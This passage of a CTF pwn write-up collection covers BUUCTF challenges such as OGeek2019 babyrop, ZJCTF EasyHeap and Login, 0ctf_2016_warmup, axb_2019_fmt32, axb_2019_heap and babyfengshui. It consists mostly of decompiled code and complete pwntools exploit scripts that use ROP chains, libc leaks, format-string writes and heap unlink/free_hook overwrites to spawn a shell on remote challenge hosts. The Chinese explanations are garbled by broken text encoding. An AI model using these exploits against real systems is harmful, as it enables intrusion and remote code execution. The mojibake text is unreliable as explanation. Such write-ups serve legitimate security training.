p64(read_got) + p64(0)payload += p64(printf_plt) + p64(main_plt)p.recvuntil(&quot;name? &quot;)p.sendline(payload)p.recvuntil(&quot;!\\n&quot;)read_real = u64(p.recv(6).ljust(8,&quot;\\x00&quot;))libc_base = read_real - libc.sym[&#x27;read&#x27;]sys_addr = libc.sym[&quot;system&quot;] + libc_basebinsh = libc.search(&quot;/bin/sh&quot;).next() + libc_basepayload = &#x27;a&#x27;*0x28payload += p64(pop_rdi_ret) + p64(binsh)payload += p64(sys_addr)p.recvuntil(&quot;name? &quot;)p.sendline(payload)p.interactive() flag ä½ç½®åœ¨ /home/babyrop2/ [OGeek2019]babyrop 1.checksec() 12345Arch: i386-32-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 1234567891011121314int __cdecl main()&#123; int buf; // [esp+4h] [ebp-14h] char v2; // [esp+Bh] [ebp-Dh] int fd; // [esp+Ch] [ebp-Ch] sub_80486BB(); fd = open(&quot;/dev/urandom&quot;, 0); if ( fd &gt; 0 ) read(fd, &amp;buf, 4u); v2 = sub_804871F(buf); sub_80487D0(v2); return 0;&#125; sub_804871F 12345678910111213141516171819int __cdecl sub_804871F(int a1)&#123; size_t v1; // eax char s; // [esp+Ch] [ebp-4Ch] char buf[7]; // [esp+2Ch] [ebp-2Ch] unsigned __int8 v5; // [esp+33h] [ebp-25h] ssize_t v6; // [esp+4Ch] [ebp-Ch] memset(&amp;s, 0, 0x20u); memset(buf, 0, 0x20u); sprintf(&amp;s, &quot;%ld&quot;, a1); v6 = read(0, buf, 0x20u); buf[v6 - 1] = 0; v1 = strlen(buf); if ( strncmp(buf, &amp;s, v1) ) exit(0); write(1, &quot;Correct\\n&quot;, 8u); return v5;&#125; sub_80487D0 1234567891011ssize_t __cdecl sub_80487D0(char a1)&#123; ssize_t result; // eax char buf; // [esp+11h] [ebp-E7h] if ( a1 == 127 ) result = read(0, &amp;buf, 0xC8u); else result = read(0, &amp;buf, a1); return result;&#125; sprintfï¼šsprintf è¿”å›ä»¥formatä¸ºæ ¼å¼argumentä¸ºå†…å®¹ç»„æˆçš„ç»“æœè¢«å†™å…¥stringçš„å­—èŠ‚æ•°ï¼Œç»“æŸå­—ç¬¦â€˜\\0â€™ä¸è®¡å…¥å†…ã€‚å³ï¼Œå¦‚æœâ€œHelloâ€è¢«å†™å…¥ç©ºé—´è¶³å¤Ÿå¤§çš„stringåï¼Œå‡½æ•°sprintf è¿”å›5 ä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€ä¸ªæ˜¯â€™\\0â€™å¯ä»¥ç»•è¿‡æ£€æµ‹ string 1234567LOAD:0804840B 00000006 C writeLOAD:08048411 0000000F C __gmon_start__LOAD:08048420 0000000A C GLIBC_2.0.rodata:08048920 0000000A C Time&#x27;s up.rodata:0804892E 00000009 C Correct\\n.rodata:08048937 0000000D C /dev/urandom.eh_frame:080489C7 00000005 C ;*2$\\&quot; æ²¡æœ‰/bin/shï¼Œæ²¡æœ‰systemå‡½æ•°ï¼Œæœ‰libcï¼Œè€ƒè™‘writeæ³„éœ²libc 3.EXP 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,28118)#p = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)write_plt = elf.plt[&quot;write&quot;]write_got = elf.got[&quot;write&quot;]main_addr = 0x08048825libc_write = libc.sym[&quot;write&quot;]libc_system = libc.sym[&quot;system&quot;]#binsh = next(libc.search(&#x27;/bin/sh&#x27;))binsh = 0x15902bpayload_1 = &#x27;\\x00&#x27;+ &#x27;\\xff&#x27;*7paylaod_2 = &#x27;a&#x27;*(0xe7+4) + p32(write_plt) + p32(main_addr)paylaod_2 += p32(1) + p32(write_got) + p32(4)p.sendline(payload_1)p.recvuntil(&quot;Correct\\n&quot;)p.sendline(paylaod_2)real_write = u32(p.recv(4))libc_base = real_write - libc_writereal_system = libc_base + libc_systembinsh = binsh + libc_basepayload_1 = &#x27;\\x00&#x27;+ &#x27;\\xff&#x27;*7payload_3 = &#x27;a&#x27;*(0xe7+4) + p32(real_system) + p32(0)payload_3 += p32(binsh)p.sendline(payload_1)p.recvuntil(&quot;Correct\\n&quot;)p.sendline(payload_3)p.interactive() æ¥å—çš„4å­—èŠ‚ä¸éœ€è¦åœ¨ljustå¯¹é½äº† [ZJCTF 2019]EasyHeap å’Œhitocn trainning magic heap ä¸€æ · 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA 123456789101112def add(sz,text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text)def edit(idx,text): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(len(text))) p.sendlineafter(&quot;:&quot;,str(text))def free(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) back_door 1234int l33t()&#123; return system(&quot;/bin/sh&quot;);&#125; edit_heap 123456printf(&quot;Size of Heap : &quot;, (char *)&amp;v1 + 4, v1); read(0, (char *)&amp;v1 + 4, 8uLL); v2 = atoi((const char *)&amp;v1 + 4); printf(&quot;Content of heap : &quot;, (char *)&amp;v1 + 4, v1); read_input(heaparray[(signed int)v1], v2); return puts(&quot;Done !&quot;); æœªæ§åˆ¶è¾¹ç•Œï¼Œå †æº¢å‡º 3.EXP 123456789101112131415161718192021222324252627282930313233343536from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./magicheap&quot;)libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)p = process(&quot;./magicheap&quot;)#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25535&quot;)def add(sz,text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text)def edit(idx,text): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(len(text))) p.sendlineafter(&quot;:&quot;,str(text))def free(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))l33t = 0x6020A0if __name__ == &#x27;__main__&#x27;: add(0x60,&#x27;aaaa&#x27;) add(0x60,&#x27;aaaa&#x27;) add(0x60,&#x27;aaaa&#x27;) free(2) edit(1,&#x27;a&#x27;*0x60+p64(0)+p64(0x71)+p64(l33t-0x13)) #&lt;--æ§åˆ¶bkæŒ‡é’ˆ add(0x60,&#x27;aaaa&#x27;) #2 add(0x60,&#x27;aaaa&#x27;) #3 fake_chunk edit(3,&#x27;a&#x27;*8) p.sendlineafter(&quot;:&quot;,str(0x1305)) p.interactive() ä¸ºä»€ä¹ˆæ˜¯p64(l33t-0x13)ï¼Ÿ ç»è¿‡åŠ¨æ€è°ƒè¯•å¾—çŸ¥ï¼Œè¯¥å¤„æ˜¯unsorted biné“¾è¡¨ ä¸ºä»€ä¹ˆedit(3,â€™aâ€™*8)ï¼Ÿ è¦†å†™magicçš„å€¼ä¸ºâ€˜0x6161616161616161â€™ï¼Œä»è€Œè¿›å…¥åé—¨ [ZJCTF 2019]Login 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345678910111213printf(&quot;Please enter username: &quot;, &quot;admin&quot;); User::read_name((User *)&amp;login); printf(&quot;Please enter password: &quot;); v3 = (void (*)(void))main::&#123;lambda(void)#1&#125;::operator void (*)(void) const(); v7 = password_checker(v3); User::read_password((User *)&amp;login); v4 = User::get_password((User *)&amp;v8); v5 = User::get_password((User *)&amp;login); password_checker(void (*)(void))::&#123;lambda(char const*,char const*)#1&#125;::operator() const( (void (__fastcall ***)(char *))&amp;v7, (const char *)v5, (const char *)v4); return 0; password_checker 123456789101112131415161718unsigned __int64 __fastcall password_checker(void (*)(void))::&#123;lambda(char const*,char const*)#1&#125;::operator() const(void (__fastcall ***a1)(char *), const char *a2, const char *a3)&#123; char s; // [rsp+20h] [rbp-60h] unsigned __int64 v5; // [rsp+78h] [rbp-8h] v5 = __readfsqword(0x28u); if ( !strcmp(a2, a3) ) &#123; snprintf(&amp;s, 0x50uLL, &quot;Password accepted: %s\\n&quot;, &amp;s); puts(&amp;s); (**a1)(&amp;s); &#125; else &#123; puts(&quot;Nope!&quot;); &#125; return __readfsqword(0x28u) ^ v5;&#125; strcmpé‡è§\\x00æˆªæ–­ï¼Œä¸ä¼šåˆ¤æ–­ä¹‹åçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™é‡Œæ ˆæº¢å‡º 3.EXP 12345678from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,25930)back_door = 0x400E88payload = &#x27;2jctf_pa5sw0rd&#x27;+&quot;\\x00&quot;+&#x27;a&#x27;*20+&quot;\\x00&quot;+&#x27;a&#x27;*36+p64(back_door)p.sendlineafter(&quot;username: &quot;,&quot;admin&quot;)p.sendlineafter(&quot;password: &quot;,payload)p.interactive() [ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 ç¯å¢ƒï¼šubuntu16 1.checksec() 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 1234567891011121314151617181920212223242526272829303132333435363738394041int __cdecl main(int a1)&#123; unsigned int v1; // eax int fd; // ST14_4 int result; // eax int v4; // ecx unsigned int v5; // et1 char nptr; // [esp+4h] [ebp-80h] char buf; // [esp+14h] [ebp-70h] unsigned int v8; // [esp+78h] [ebp-Ch] int *v9; // [esp+7Ch] [ebp-8h] v9 = &amp;a1; v8 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); v1 = time(0); srand(v1); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;unk_804C044, 4u); printf(&quot;your name:&quot;); //====+FORMAT+==== read(0, &amp;buf, 0x63u); printf(&quot;Hello,&quot;); printf(&amp;buf); printf(&quot;your passwd:&quot;); read(0, &amp;nptr, 0xFu); // ====+STACK_OVERFLOW+==== if ( atoi(&amp;nptr) == unk_804C044 ) &#123; puts(&quot;ok!!&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;fail&quot;); &#125; result = 0; v5 = __readgsdword(0x14u); v4 = v5 ^ v8; if ( v5 != v8 ) sub_80493D0(v4); return result;&#125; unk_804C044 12345678910bss:0804C040 byte_804C040 db ? ; DATA XREF: sub_8049140â†‘o.bss:0804C040 ; sub_8049140+5â†‘o ....bss:0804C041 align 4.bss:0804C044 randmon_num db ? ; ; DATA XREF: main+77â†‘o.bss:0804C044 ; main+108â†‘o.bss:0804C045 db ? ;.bss:0804C046 db ? ;.bss:0804C047 db ? ;.bss:0804C047 _bss ends.bss:0804C047 bssæ®µçš„unk_804C044ï¼Œæ˜¯éšæœºç”Ÿæˆçš„ï¼Œè€Œæˆ‘ä»¬çŒœå¯¹äº†è¿™ä¸ªå‚æ•°ï¼Œå°±å¯ä»¥æ‰§è¡Œsystem(â€œ/bin/shâ€),åˆšå¥½å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´å¯ä»¥å®ç°æ”¹å†™å†…å­˜åœ°å€çš„å€¼ è¿˜æœ‰å°±æ˜¯ä¸è¦è¢«å¼€å¯çš„canaryä¿æŠ¤è¿·æƒ‘ 3.è®¡ç®—åç§» 123root@joe1sn:~/download/BUUCTF/PWN5# ./pwn your name:aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%pHello,aaaa-0xffb44588-0x63-(nil)-(nil)-0x3-0xf7f8c950-0xc2-(nil)-0xc30000-0x61616161-0x2d70252d-0x252d7025-0x70252d70 ç¬¬ä¸€ä¸ªå‚æ•°åç§»é‡ä¸º10ï¼Œé€šè¿‡%nä¿®æ”¹ %xæ˜¯å§æ•°æ®ä»¥16è¿›åˆ¶è¾“å‡º %næ˜¯æŠŠå·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°ç›®è¾“å…¥ä¼ æ¥å‚æ•°çš„åœ°å€ä¸­ï¼Œè¿™å°±å¯ä»¥ä½¿æˆ‘ä»¬ä¿®æ”¹æ•°æ® https://www.cnblogs.com/0xJDchen/p/5904816.html 4.EXP 123456789from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26486)unk_804C044 = 0x0804C044payload=fmtstr_payload(10,&#123;unk_804C044:0x11111111&#125;)p.sendlineafter(&quot;your name:&quot;,payload)p.sendlineafter(&quot;your passwd&quot;,str(0x11111111))p.interactive() 0ctf_2016_warmup 1.checksec 12345Arch: i386-32-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA ä»æ±‡ç¼–çœ‹æœ‰å››ä¸ªå‡½æ•° Alarm ã€Read ã€Write ã€sys_exit å…³äº Alarm æœ‰ä¸ªç‰¹æ€§ï¼š å¦‚æœæœ‰ä»¥å‰ä¸ºè¿›ç¨‹ç™»è®°çš„å°šæœªè¶…æ—¶çš„é—¹é’Ÿæ—¶é’Ÿï¼Œè€Œä¸”æœ¬æ¬¡è°ƒç”¨çš„secondså€¼æ˜¯0ï¼Œåˆ™å–æ¶ˆä»¥å‰çš„é—¹é’Ÿæ—¶é’Ÿï¼Œå…¶ä½™ç•™å€¼ä»ä½œä¸ºalarmå‡½æ•°çš„è¿”å›å€¼ é‚£ä¹ˆå½“ alarm å‰©ä½™ 5 ç§’æ—¶ï¼Œæ›´å…·æ±‡ç¼–fastcallï¼Œä¼šå°†returnå€¼è¿”å› eax å¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆå†æ¬¡ä½¿ç”¨ sys_call çš„æ—¶å€™å°±ä¼š ç³»ç»Ÿè°ƒç”¨ openå‡½æ•° ï¼Œä»è€Œè¯»å–åˆ°falgçš„å€¼ 3.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *name = &quot;warmup&quot;elf = ELF(name)libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)sh = 0def main(ip,port,debug,mode): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(name) else: sh = remote(ip,port) main_addr = 0x804815A write_addr = 0x8048135 read_addr = 0x804811D alarm_addr = 0x804810D data_seg = 0x80491BC sys_call = 0x804813A #Step1 #å‘ç³»ç»Ÿä¸­ä¼ é€’å‚æ•° &quot;flag&quot; payload = &#x27;a&#x27;*0x20 payload += p32(read_addr)+p32(main_addr) payload += p32(0)+p32(data_seg)+p32(0x10) sh.sendafter(&quot;Welcome to 0CTF 2016!\\n&quot;,payload) payload = &#x27;flag\\x00&#x27; sh.sendlineafter(&quot;Good Luck!\\n&quot;,payload) #Step2 #0xa-5=5 #è¿™æ ·å‰©ä¸‹çš„å°±5säº† sleep(5) #Step3 #å†æ¬¡è°ƒç”¨alarmå‡½æ•°å°±ä¼šè¿”å›å‰©ä½™çš„ç§’æ•°5åˆ° eaxå¯„å­˜å™¨ä¸­ #å°±ä¼šå°†falgæ–‡ä»¶è¯»å–åˆ° dataæ®µ payload = &#x27;a&#x27;*0x20 payload += p32(alarm_addr)+p32(sys_call) payload += p32(main_addr)+p32(data_seg)+p32(0) sh.send(payload) #Step4 #ä»dataæ®µä¸­read payload = &#x27;a&#x27;*0x20 payload += p32(read_addr)+p32(main_addr) payload += p32(3)+p32(data_seg)+p32(0x50) sh.sendafter(&quot;Good Luck!\\n&quot;,payload) #Step5 #åˆ©ç”¨writeå†™å‡ºflag payload = &#x27;a&#x27;*0x20 payload += p32(write_addr)+p32(main_addr) payload += p32(1)+p32(data_seg)+p32(0x50) sh.sendafter(&#x27;Good Luck!\\n&#x27;,payload) sh.interactive()if __name__ == &#x27;__main__&#x27;: main(&quot;node3.buuoj.cn&quot;,&quot;28290&quot;,1,1) axb_2019_fmt32 1.cheksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2 .IDA main 123456789101112while ( 1 ) &#123; alarm(3u); memset(&amp;s, 0, 0x101u); memset(&amp;format, 0, 0x12Cu); printf(&quot;Please tell me:&quot;); read(0, &amp;s, 0x100u); sprintf(&amp;format, &quot;Repeater:%s\\n&quot;, &amp;s); if ( strlen(&amp;format) &gt; 0x10E ) break; printf(&amp;format); &#125; å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´ï¼Œä½†æ˜¯æ²¡æœ‰åé—¨ï¼Œå¯ä»¥é€‰æ‹©libc leak+æ”¹printfä¸ºone gadget 3.EXP 12345678910111213141516171819202122from pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&quot;./axb_2019_fmt32&quot;)p = remote(&quot;node3.buuoj.cn&quot;,25318)libc = ELF(&quot;libc-2.23.so&quot;)#0x3a80c execve(&quot;/bin/p&quot;, esp+0x28, environ)p.sendlineafter(&#x27;me:&#x27;,&quot;%9$sA&quot; + p32(elf.got[&quot;printf&quot;]))p.recvuntil(&#x27;Repeater:&#x27;)printf_got = u32(p.recv(4))base = printf_got - libc.sym[&quot;printf&quot;]system = base + libc.sym[&quot;system&quot;]log.success(&quot;printf addr: %x&quot; , printf_got)log.success(&quot;system addr: %x&quot; , system)log.success(&quot;libc base: %x&quot; , base)payload =&#x27;aaaaa&#x27;payload += fmtstr_payload(9,&#123;0x804A014: (0x3a80c+base)&#125;,write_size = &quot;byte&quot;,numbwritten = 0xe)p.sendlineafter(&quot;me:&quot;,payload)p.interactive() axb_2019_heap 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA banner 123__isoc99_scanf(&quot;%s&quot;, &amp;format); printf(&quot;Hello, &quot;, &amp;format); printf(&amp;format); å­˜åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´ main 1234567891011121314def add(idx,sz,text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text)def delete(idx): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def edit(idx,text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,text) edit_note 123456if ( v1 &lt;= 10 &amp;&amp; v1 &gt;= 0 &amp;&amp; *((_QWORD *)&amp;note + 2 * v1) ) &#123; puts(&quot;Enter the content: &quot;); get_input(*((_QWORD *)&amp;note + 2 * v1), *((_DWORD *)&amp;note + 4 * v1 + 2)); puts(&quot;Done!&quot;); &#125; æ²¡æœ‰æ§åˆ¶èŒƒå›´ï¼Œå †æº¢å‡ºï¼Œåˆ©ç”¨unlink+free_hookæ¥getshell 3.GDB åœ¨printfå¤„ä¸‹æ–­ç‚¹fmtargæŸ¥çœ‹åç§» stack 12345678910111213141516171819202122gdb-peda$ stack 200000| 0x7fffffffde10 --&gt; 0x0 0008| 0x7fffffffde18 --&gt; 0x61616161ffffde30 0016| 0x7fffffffde20 (&#x27;a&#x27; &lt;repeats 15 times&gt;)0024| 0x7fffffffde28 --&gt; 0x61616161616161 (&#x27;aaaaaaa&#x27;)0032| 0x7fffffffde30 --&gt; 0x7fffffffde50 --&gt; 0x555555555200 (&lt;__libc_csu_init&gt;: push r15)0040| 0x7fffffffde38 --&gt; 0x555555555186 (&lt;main+28&gt;: mov eax,0x0)0048| 0x7fffffffde40 --&gt; 0x7fffffffdf30 --&gt; 0x1 0056| 0x7fffffffde48 --&gt; 0x0 0064| 0x7fffffffde50 --&gt; 0x555555555200 (&lt;__libc_csu_init&gt;: push r15)0072| 0x7fffffffde58 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;: mov edi,eax)0080| 0x7fffffffde60 --&gt; 0x1 0088| 0x7fffffffde68 --&gt; 0x7fffffffdf38 --&gt; 0x7fffffffe2a7 (&quot;/home/joe1sn/Documents/question/abx_2019_heap/axb_2019_heap&quot;)0096| 0x7fffffffde70 --&gt; 0x1f7ffcca0 0104| 0x7fffffffde78 --&gt; 0x55555555516a (&lt;main&gt;: push rbp)0112| 0x7fffffffde80 --&gt; 0x0 0120| 0x7fffffffde88 --&gt; 0xa45414fa738fad69 0128| 0x7fffffffde90 --&gt; 0x555555554980 (&lt;_start&gt;: xor ebp,ebp)0136| 0x7fffffffde98 --&gt; 0x7fffffffdf30 --&gt; 0x1 0144| 0x7fffffffdea0 --&gt; 0x0 0152| 0x7fffffffdea8 --&gt; 0x0 åç§» 1234gdb-peda$ fmtarg 0x7fffffffde50 #base offsetThe index of format argument : 14 (&quot;\\%13$p&quot;)gdb-peda$ fmtarg 0x7fffffffde58 #libc offsetThe index of format argument : 15 (&quot;\\%14$p&quot;) vmmap 12340x0000555555554000 0x0000555555556000 r-xp /home/joe1sn/Documents/question/abx_2019_heap/axb_2019_heap...........0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so........... 1234&gt;&gt;&gt; hex(0x7ffff7a2d830 - 0x00007ffff7a0d000) #libc åç§»é‡&#x27;0x20830&#x27;&gt;&gt;&gt; hex(0x555555555200 - 0x0000555555554000)&#x27;0x1200&#x27; 4.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *elf = ELF(&quot;./axb_2019_heap&quot;)libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)p = process(&quot;./axb_2019_heap&quot;)#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25618&quot;)def add(idx,sz,text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text)def delete(idx): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def edit(idx,text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,text)if __name__ == &#x27;__main__&#x27;: p.sendlineafter(&quot;:&quot;,&quot;%14$p-%15$p&quot;) p.recvuntil(&quot;Hello, &quot;) axb_leak = int(p.recv(14),16) p.recvuntil(&quot;-&quot;) libc_leak = int(p.recv(14),16) axb_base = axb_leak-0x1200 libc_base = libc_leak-0x20830 bss_addr = axb_base+0x202060 sys_addr = libc_base+libc.sym[&quot;system&quot;] free_addr = libc_base+libc.sym[&quot;__free_hook&quot;] success(&quot;axb base=&gt;0x%x&quot;,axb_leak) success(&quot;libc base=&gt;0x%x&quot;,libc_base) success(&quot;bss addr=&gt;0x%x&quot;,bss_addr) success(&quot;system addr=&gt;0x%x&quot;,sys_addr) success(&quot;free addr=&gt;0x%x&quot;,free_addr) add(0,0x98,&#x27;0&#x27;*0x98) add(1,0x98,&#x27;1111&#x27;) add(2,0x90,&#x27;2222&#x27;) add(3,0x90,&#x27;/bin/sh\\x00&#x27;) # fake chunk fake.sz fake.fd fake.bk repair payload=p64(0)+p64(0x91)+p64(bss_addr-0x18)+p64(bss_addr-0x10)+p64(0)*14+p64(0x90)+&#x27;\\xa0&#x27; edit(0,payload) #gdb.attach(p) delete(1) #free fake chunk #gdb.attach(p) edit(0,p64(0)*3+p64(free_addr)+p64(0x10))#in fake chunks #gdb.attach(p) edit(0,p64(sys_addr))#free-&gt;got #gdb.attach(p) delete(3) p.interactive() babyfengshui_33c3_2016 1.checksec 123456[*] &#x27;/home/joe1sn/Documents/ctf/questions/BUUCTF/pwn/babyfengshui_33c3_2016/babyfengshui&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) RELRO: Partial RELROå¯ä»¥æ”¹å†™GOTè¡¨ 2.IDA main 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758void __cdecl __noreturn main()&#123; char v0; // [esp+3h] [ebp-15h] int v1; // [esp+4h] [ebp-14h] size_t v2; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); alarm(0x14u); while ( 1 ) &#123; puts(&quot;0: Add a user&quot;); puts(&quot;1: Delete a user&quot;); puts(&quot;2: Display a user&quot;); puts(&quot;3: Update a user description&quot;); puts(&quot;4: Exit&quot;); printf(&quot;Action: &quot;); if ( __isoc99_scanf(&quot;%d&quot;, &amp;v1) == -1 ) break; if ( !v1 ) &#123; printf(&quot;size of description: &quot;); // size of chunk __isoc99_scanf(&quot;%u%c&quot;, &amp;v2, &amp;v0); add_usr(v2); &#125; if ( v1 == 1 ) &#123; printf(&quot;index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); delet_usr(v2); &#125; if ( v1 == 2 ) &#123; printf(&quot;index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); display(v2); &#125; if ( v1 == 3 ) &#123; printf(&quot;index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); text_rewrite(v2); &#125; if ( v1 == 4 ) &#123; puts(&quot;Bye&quot;); exit(0); &#125; if ( (unsigned __int8)byte_804B069 &gt; 0x31u ) &#123; puts(&quot;maximum capacity exceeded, bye&quot;); exit(0); &#125; &#125; exit(1);&#125; add_usr 12345678910111213141516_DWORD *__cdecl add_usr(size_t a1)&#123; void *s; // ST24_4 _DWORD *v2; // ST28_4 s = malloc(a1); // ç”³è¯·çš„descriptionå¤§å° memset(s, 0, a1); v2 = malloc(0x80u); memset(v2, 0, 0x80u); // v2çš„å¤§å°ä¸º0x80 *v2 = s; ptr[(unsigned __int8)byte_804B069] = v2; // å°†æŒ‡é’ˆä¿å­˜è‡³æŒ‡é’ˆæ•°ç»„ä¸­ printf(&quot;name: &quot;); sub_80486BB((char *)ptr[(unsigned __int8)byte_804B069] + 4, 0x7C);// fgets 0x7ä¸ªå­—ç¬¦ text_rewrite(++byte_804B069 - 1); // å†™å…¥text return v2;&#125; å‡½æ•°é¦–å…ˆåˆ†é…ä¸€ä¸ªdescriptionçš„æœ€å¤§ç©ºé—´ï¼Œè®©ä½ åå†åˆ†é…ç»™userç»“æ„ä½“çš„ç©ºé—´ï¼Œå¹¶å°†useræ”¾å…¥storeæ•°ç»„ä¸­ï¼Œæœ€åè°ƒç”¨æ›´æ–°decriptionçš„å‡½æ•° 123456struct user&#123; char *desc; char name[0x7c];&#125;user;struct user *store[]; storeæ”¾åœ¨0x804b080ï¼Œå½“å‰userä¸ªæ•°user_numæ”¾åœ¨0x804b069ï¼ˆbyte_804B069ï¼‰ https://blog.csdn.net/qinying001/article/details/104359401 å¯ä»¥ä»è¿™ç¯‡æ–‡ç« çœ‹å †çš„æƒ…å†µï¼Œè¿™é‡Œæˆ‘å¤§è‡´ç”»ä¸€ä¸‹ 1234#codeadd_user(0x80, 0x80, &#x27;AAAA&#x27;) # 0add_user(0x80, 0x80, &#x27;AAAA&#x27;) # 1 add_user(0x8, 0x8, &#x27;/bin/sh\\x00&#x27;) # 2 1234567=========================================|| chunk0_desc 0x80 | chunk0_node 0x80 ||=========================================|| chunk1_desc 0x80 | chunk1_node 0x80 ||=========================================|| chunk2_desc 0x8 | chunk2_node 0x8 || ========================================= 12#codedelete_user(0) 1234567=========================================|| freed_chunk 0x100 ||=========================================|| chunk1_desc 0x80 | chunk1_node 0x80 ||=========================================|| chunk2_desc 0x8 | chunk2_node 0x8 || ========================================= 12#codeadd_user(0x100, 0x19c, &quot;A&quot;*(0x100+0x80+0x8+0x10) + p32(elf.got[&#x27;free&#x27;])) # 0 *desc-&gt;free_got 123456789=======================|| chunk0_desc 0x100 || &lt;--first fitè§„åˆ™ç¬¦åˆ=========================================|| chunk1_desc 0x80 | chunk1_node 0x80 ||=========================================|| chunk2_desc 0x8 | chunk2_node 0x8 || =========================================|| chunk0_node 0x80 || &lt;--è¢«é‡æ–°åˆ†é…======================= æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆæ·»åŠ ä¸¤ä¸ªuserï¼Œç”¨äºç»•è¿‡æ£€æŸ¥ã€‚ ç¬¬3ä¸ªuserå­˜æ”¾&quot;/bin/sh&quot;ã€‚ ç„¶ååˆ  æ‰ç¬¬1ä¸ªuserï¼Œå¹¶åˆ›å»ºä¸€ä¸ªdescriptionå¾ˆé•¿çš„userï¼Œå…¶é•¿åº¦æ˜¯ç¬¬1ä¸ªuserçš„descriptioné•¿åº¦åŠ ä¸Šuserç»“æ„ä½“é•¿åº¦ã€‚è¿™æ—¶å€™æ£€æŸ¥å°±ç»•äº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ·»åŠ æ–°userçš„æ—¶å€™ä¿®æ”¹descriptionå¤§å°ï¼Œé€ æˆå †æº¢å‡ºï¼Œå¹¶ä¿®æ”¹ç¬¬2ä¸ªuserçš„user&gt;descä¸ºfree@got.pltï¼Œä»è€Œæ³„æ¼å‡ºlibcåœ°å€ã€‚ 